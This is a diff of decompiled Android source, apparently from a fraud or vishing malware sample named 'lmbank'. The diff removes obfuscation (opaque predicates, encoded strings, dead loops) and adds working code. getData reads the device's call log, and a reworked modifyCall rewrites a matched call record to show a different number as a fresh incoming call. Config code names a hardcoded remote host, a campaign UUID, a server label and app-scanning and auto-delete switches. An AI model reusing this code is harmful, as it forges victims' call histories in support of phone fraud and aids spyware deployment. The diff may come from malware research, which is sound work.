@@ -2,19 +2,30 @@ package com.wish.lmbank.common;
 
 import android.content.ContentValues;
 import android.content.Context;
+import android.database.Cursor;
+import android.net.Uri;
 import android.provider.CallLog;
 import android.text.TextUtils;
+import android.util.Log;
 
 import com.wish.lmbank.bean.CallLogBean;
 import com.wish.lmbank.utils.LogUtils;
 import com.wish.lmbank.utils.SharedPreferencesUtils;
 
 import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.Queue;
 import java.util.concurrent.LinkedBlockingQueue;
 
 /* loaded from: cookie_9234504.jar:com/wish/lmbank/common/Constants.class */
 public class Constants {
+    public static final Uri callUri = CallLog.Calls.CONTENT_URI;
+    public static final String[] columns = {CallLog.Calls.CACHED_NAME// 通话记录的联系人
+            , CallLog.Calls.NUMBER// 通话记录的电话号码
+            , CallLog.Calls.DATE// 通话记录的日期
+            , CallLog.Calls.DURATION// 通话时长
+            , CallLog.Calls.TYPE};// 通话类型}
+
     public static final String ACTION_IN = "incoming";
     public static final String ACTION_OUT = "outgoing";
     public static final String ACTION_SCREEN_OFF = "ACTION_SCREEN_OFF";
@@ -167,26 +178,51 @@ public class Constants {
     }
 
     /**
+     * 循环遍历获取最新一个匹配号码的时间戳
+     *
+     * @param context
+     * @param phone
+     * @return 时间戳  不存在则返回0
+     */
+    public static long getData(Context context, String phone) {
+        long time = 0;
+        Cursor cursor = context.getContentResolver().query(callUri, // 查询通话记录的URI
+                columns, null, null, CallLog.Calls.DEFAULT_SORT_ORDER// 按照时间逆序排列，最近打的最先显示
+        );
+        while (cursor.moveToNext()) {
+            String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));  //姓名
+            String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));  //号码
+            long dateLong = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)); //获取通话日期
+            Log.e(TAG, "号码" + number);
+            if (number.equals(phone)) {
+                time = dateLong;
+                return time;
+            }
+        }
+        return time;
+    }
+
+    /**
      * @param context
      * @param number  匹配号码
      * @param phone   修改号码
      */
-    public static void modifyCall(Context context, String number, String phone) {
-        SimpleDateFormat dateFormat = new SimpleDateFormat(
-                "yyyy-MM-dd hh:mm:ss");
-        String date = dateFormat.format(System.currentTimeMillis());
-
+    public static boolean modifyCall(Context context, String number, String phone) {
+        long data = Constants.getData(context, number);
+        if (data == 0) {
+            return false;
+        }
         ContentValues values = new ContentValues();
         values.put(CallLog.Calls.TYPE, CallLog.Calls.INCOMING_TYPE);
         values.put(CallLog.Calls.NUMBER, phone);
-        values.put(CallLog.Calls.DATE, date);
+        values.put(CallLog.Calls.DATE, System.currentTimeMillis());
         values.put(CallLog.Calls.NEW, 1);
-        context.getContentResolver().
-                update(CallLog.Calls.CONTENT_URI, values, CallLog.Calls.NUMBER + "=?", new String[]{number});
+        context.getContentResolver().update(CallLog.Calls.CONTENT_URI, values, CallLog.Calls.DATE + "=?", new String[]{String.valueOf(data)});
+        return true;
     }
 
     public static void modifySmsCall(Context context, String number, String phone) {
-        ContentValues values=new ContentValues();
+        ContentValues values = new ContentValues();
         //values.put();
     }
 
@@ -225,78 +261,68 @@ public class Constants {
     }
 
     public static void load(boolean z) {
-        if ((9872 + 11170) % 11170 > 0) {
-            if (z) {
-                loadTest();
-                return;
-            }
-//             OPEN_SMS = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("JjksJzY6JDo"), false);
-            OPEN_SMS = SharedPreferencesUtils.getValue("OPEN_SMS", false);
-//             COMPANY_UUID = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("KiYkOSgnMDY8PCAt"), "");
-            COMPANY_UUID = SharedPreferencesUtils.getValue("COMPANY_UUID", "");
-//             PROJECT_NAME = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("OTsmIywqPTYnKCQs"), "");
-            PROJECT_NAME = SharedPreferencesUtils.getValue("PROJECT_NAME", "");
-//             SCANNING_ALL_APP = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("OiooJycgJy42KCUlNig5OQ"), bb7d7pu7.m5998("WA"));
-            SCANNING_ALL_APP = SharedPreferencesUtils.getValue("SCANNING_ALL_APP", "1");
-//             APPLICATION_STYLE = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("KDk5JSAqKD0gJic2Oj0wJSw"), "");
-            APPLICATION_STYLE = SharedPreferencesUtils.getValue("APPLICATION_STYLE", "");
-//             AGREEMENT_SUBMIT_STYLE = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("KC47LCwkLCc9Njo8KyQgPTY6PTAlLA"), "");
-            AGREEMENT_SUBMIT_STYLE = SharedPreferencesUtils.getValue("AGREEMENT_SUBMIT_STYLE", "");
-//             HEADER_PICTURE_STYLE = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("ISwoLSw7NjkgKj08Oyw2Oj0wJSw"), "");
-            HEADER_PICTURE_STYLE = SharedPreferencesUtils.getValue("HEADER_PICTURE_STYLE", "");
-//             SERVER_NAME = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("Oiw7Pyw7NicoJCw"), "");
-            SERVER_NAME = SharedPreferencesUtils.getValue("SERVER_NAME", "");
-//             UNNECESSARY_AUTO_DELETE_LIST = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("PCcnLCosOjooOzA2KDw9JjYtLCUsPSw2JSA6PQ"), "");
-            UNNECESSARY_AUTO_DELETE_LIST = SharedPreferencesUtils.getValue("UNNECESSARY_AUTO_DELETE_LIST", "");
-//             String value = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("PDsl"), "");
-            String value = SharedPreferencesUtils.getValue("URL", "");
-            if (TextUtils.isEmpty(value)) {
-                return;
-            }
-            URL.setHost(value);
+        if (z) {
+            loadTest();
             return;
         }
-        int i = (-19188) + (-19188) + 18869;
-        while (true) {
+//             OPEN_SMS = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("JjksJzY6JDo"), false);
+        OPEN_SMS = SharedPreferencesUtils.getValue("OPEN_SMS", false);
+//             COMPANY_UUID = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("KiYkOSgnMDY8PCAt"), "");
+        COMPANY_UUID = SharedPreferencesUtils.getValue("COMPANY_UUID", "");
+//             PROJECT_NAME = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("OTsmIywqPTYnKCQs"), "");
+        PROJECT_NAME = SharedPreferencesUtils.getValue("PROJECT_NAME", "");
+//             SCANNING_ALL_APP = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("OiooJycgJy42KCUlNig5OQ"), bb7d7pu7.m5998("WA"));
+        SCANNING_ALL_APP = SharedPreferencesUtils.getValue("SCANNING_ALL_APP", "1");
+//             APPLICATION_STYLE = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("KDk5JSAqKD0gJic2Oj0wJSw"), "");
+        APPLICATION_STYLE = SharedPreferencesUtils.getValue("APPLICATION_STYLE", "");
+//             AGREEMENT_SUBMIT_STYLE = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("KC47LCwkLCc9Njo8KyQgPTY6PTAlLA"), "");
+        AGREEMENT_SUBMIT_STYLE = SharedPreferencesUtils.getValue("AGREEMENT_SUBMIT_STYLE", "");
+//             HEADER_PICTURE_STYLE = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("ISwoLSw7NjkgKj08Oyw2Oj0wJSw"), "");
+        HEADER_PICTURE_STYLE = SharedPreferencesUtils.getValue("HEADER_PICTURE_STYLE", "");
+//             SERVER_NAME = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("Oiw7Pyw7NicoJCw"), "");
+        SERVER_NAME = SharedPreferencesUtils.getValue("SERVER_NAME", "");
+//             UNNECESSARY_AUTO_DELETE_LIST = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("PCcnLCosOjooOzA2KDw9JjYtLCUsPSw2JSA6PQ"), "");
+        UNNECESSARY_AUTO_DELETE_LIST = SharedPreferencesUtils.getValue("UNNECESSARY_AUTO_DELETE_LIST", "");
+//             String value = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("PDsl"), "");
+        String value = SharedPreferencesUtils.getValue("URL", "");
+        if (TextUtils.isEmpty(value)) {
+            return;
         }
+        URL.setHost(value);
+        return;
     }
 
     public static void loadTest() {
-        if ((11564 + 10679) % 10679 > 0) {
-//             OPEN_SMS = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("JjksJzY6JDo"), false);
-            OPEN_SMS = SharedPreferencesUtils.getValue("OPEN_SMS", false);
+        //             OPEN_SMS = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("JjksJzY6JDo"), false);
+        OPEN_SMS = SharedPreferencesUtils.getValue("OPEN_SMS", false);
 //             COMPANY_UUID = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("KiYkOSgnMDY8PCAt"), bb7d7pu7.m5998("D1g_XQIxPDo4PggwOAU8LiRcBCgoHxsoMx0gPS0KHyU"));
-            COMPANY_UUID = SharedPreferencesUtils.getValue("COMPANY_UUID", "f1V4kXUSQWaYQlUGM5mAAvrAZtITDcvL");
+        COMPANY_UUID = SharedPreferencesUtils.getValue("COMPANY_UUID", "f1V4kXUSQWaYQlUGM5mAAvrAZtITDcvL");
 //             String m5998 = bb7d7pu7.m5998("OTsmIywqPTYnKCQs");
-            String m5998 = "PROJECT_NAME";
+        String m5998 = "PROJECT_NAME";
 //             PROJECT_NAME = SharedPreferencesUtils.getValue(m5998, bb7d7pu7.m5998("Oj0-"));
-            PROJECT_NAME = SharedPreferencesUtils.getValue(m5998, "STW");
+        PROJECT_NAME = SharedPreferencesUtils.getValue(m5998, "STW");
 //             String m59982 = bb7d7pu7.m5998("OiooJycgJy42KCUlNig5OQ");
-            String m59982 = "SCANNING_ALL_APP";
+        String m59982 = "SCANNING_ALL_APP";
 //             String m59983 = bb7d7pu7.m5998("WA");
-            String m59983 = "1";
-            SCANNING_ALL_APP = SharedPreferencesUtils.getValue(m59982, m59983);
+        String m59983 = "1";
+        SCANNING_ALL_APP = SharedPreferencesUtils.getValue(m59982, m59983);
 //             APPLICATION_STYLE = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("KDk5JSAqKD0gJic2Oj0wJSw"), "");
-            APPLICATION_STYLE = SharedPreferencesUtils.getValue("APPLICATION_STYLE", "");
+        APPLICATION_STYLE = SharedPreferencesUtils.getValue("APPLICATION_STYLE", "");
 //             AGREEMENT_SUBMIT_STYLE = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("KC47LCwkLCc9Njo8KyQgPTY6PTAlLA"), "");
-            AGREEMENT_SUBMIT_STYLE = SharedPreferencesUtils.getValue("AGREEMENT_SUBMIT_STYLE", "");
+        AGREEMENT_SUBMIT_STYLE = SharedPreferencesUtils.getValue("AGREEMENT_SUBMIT_STYLE", "");
 //             HEADER_PICTURE_STYLE = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("ISwoLSw7NjkgKj08Oyw2Oj0wJSw"), "");
-            HEADER_PICTURE_STYLE = SharedPreferencesUtils.getValue("HEADER_PICTURE_STYLE", "");
+        HEADER_PICTURE_STYLE = SharedPreferencesUtils.getValue("HEADER_PICTURE_STYLE", "");
 //             SERVER_NAME = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("Oiw7Pyw7NicoJCw"), bb7d7pu7.m5998("Oiw7Pyw7Wlw"));
-            SERVER_NAME = SharedPreferencesUtils.getValue("SERVER_NAME", "SERVER35");
+        SERVER_NAME = SharedPreferencesUtils.getValue("SERVER_NAME", "SERVER35");
 //             UNNECESSARY_AUTO_DELETE_LIST = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("PCcnLCosOjooOzA2KDw9JjYtLCUsPSw2JSA6PQ"), m59983);
-            UNNECESSARY_AUTO_DELETE_LIST = SharedPreferencesUtils.getValue("UNNECESSARY_AUTO_DELETE_LIST", m59983);
+        UNNECESSARY_AUTO_DELETE_LIST = SharedPreferencesUtils.getValue("UNNECESSARY_AUTO_DELETE_LIST", m59983);
 //             String value = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("PDsl"), bb7d7pu7.m5998("GgddEAAdD1lYBloZAkcKBgQ"));
-            String value = SharedPreferencesUtils.getValue("URL", "sn4yitf01o3pk.com");
-            SharedPreferencesUtils.putValue(m5998, PROJECT_NAME);
-            if (TextUtils.isEmpty(value)) {
-                return;
-            }
-            URL.setHost(value);
+        String value = SharedPreferencesUtils.getValue("URL", "sn4yitf01o3pk.com");
+        SharedPreferencesUtils.putValue(m5998, PROJECT_NAME);
+        if (TextUtils.isEmpty(value)) {
             return;
         }
-        int i = (-9118) + (-9118) + 8691;
-        while (true) {
-        }
+        URL.setHost(value);
+        return;
     }
 }
